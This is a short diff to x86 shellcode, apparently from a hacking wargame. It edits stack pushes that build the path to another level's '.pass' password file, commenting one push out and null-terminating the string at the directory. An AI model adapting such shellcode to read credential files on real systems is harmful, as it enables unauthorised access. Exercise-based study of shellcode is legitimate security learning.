@@ -8,8 +8,8 @@ _start:
 _shellcode:
 	xor eax, eax
 	push eax
-	push 0x73736170 	; pass
-	push 0x2e2f3530		; 05/.
+	; push 0x73736170 	; pass
+	push 0x002f3530		; 05/.
 	push 0x6c657665		; evel
 	push 0x6c2f7372	    	; rs/l
 	push 0x6573752f		; /use
